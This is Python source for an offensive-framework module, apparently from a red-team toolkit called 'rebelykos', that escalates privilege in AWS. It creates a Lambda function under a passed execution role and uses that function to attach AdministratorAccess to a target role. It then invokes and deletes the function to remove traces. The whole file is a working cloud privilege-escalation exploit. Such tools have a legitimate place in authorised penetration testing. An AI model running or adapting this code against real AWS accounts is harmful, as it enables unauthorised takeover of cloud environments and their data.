import base64
import os
import shlex
import tempfile
import zipfile

import boto3

from rebelykos.core.response import Response as res
from rebelykos.core.teamserver.module import Module
from rebelykos.core.utils import gen_random_string


class RLModule(Module):
    def __init__(self):
        super().__init__()
        self.name = "lambda_role_privesc"
        self.description = ("Elevate privilege by using iam:PassRole, "
                            "lambda:CreateFunction, and "
                            "lambda:InvokeFunction. "
                            "(and lambda:DeleteFunction")
        self.author = "Takahiro Yokoyama"
        self.options["RoleName"] = {
            "Description": ("The name (friendly name, not ARN) of"
                            " the role to attach the policy to."),
            "Required": True,
            "Value": ""
        }
        self.options["PolicyArn"] = {
            "Description": ("The Amazon Resource Name (ARN) of "
                            "the IAM policy you want to attach."),
            "Required": True,
            "Value": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
        self.options["RoleArn"] = {
            "Description": ("The Amazon Resource Name (ARN) of"
                            " the function's execution role."),
            "Required": True,
            "Value": ""
        }

    def run(self):
        client = boto3.client("lambda", **self["profile"])
        role = shlex.quote(self["RoleName"])
        policyarn = shlex.quote(self["PolicyArn"])
        # I'm afraid this is really secure
        lambda_privesc = f"""
import boto3


def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_role_policy(
        RoleName='{role}',
        PolicyArn='{policyarn}'
    )
    return response
"""

        func_name = gen_random_string()
        with tempfile.TemporaryDirectory() as tmpdirname:
            zfile = os.path.join(tmpdirname, "lambda_privesc.py.zip")
            with zipfile.ZipFile(zfile, "w", zipfile.ZIP_DEFLATED) as fp:
                info = zipfile.ZipInfo("lambda_privesc.py")
                info.external_attr = 0o644 << 16
                fp.writestr(info, lambda_privesc)
            os.chmod(zfile, int("755", 8))
            with open(zfile, "rb") as fp:
                zfile_bytes = fp.read()
                func_info, result = self._handle_err(
                    client.create_function,
                    FunctionName=func_name,
                    Role=self["RoleArn"],
                    Handler="lambda_privesc.lambda_handler",
                    Code={"ZipFile": zfile_bytes},
                    Runtime="python3.9"
                )
                yield func_info
                if result[0] == res.RESULT:
                    status = result[1]["ResponseMetadata"]["HTTPStatusCode"]
                    yield res.INFO, {"HTTPStatusCode": status}
                    func_info, result = self._handle_err(
                        client.invoke,
                        InvocationType="RequestResponse",
                        # LogType="Tail",
                        FunctionName=func_name
                    )
                    yield func_info
                    if result[0] == res.RESULT:
                        stat = result[1]["ResponseMetadata"]["HTTPStatusCode"]
                        yield res.INFO, {"HTTPStatusCode": stat}
                        func_info, result = self._handle_err(
                            client.delete_function,
                            FunctionName=func_name
                        )
                        yield func_info
                        if result[0] == res.RESULT:
                            res_meta = result[1]["ResponseMetadata"]
                            status = res_meta["HTTPStatusCode"]
                            yield res.INFO, {"HTTPStatusCode": status}
                        else:
                            yield result
                    else:
                        yield result
                else:
                    yield result
        yield res.END, "End"
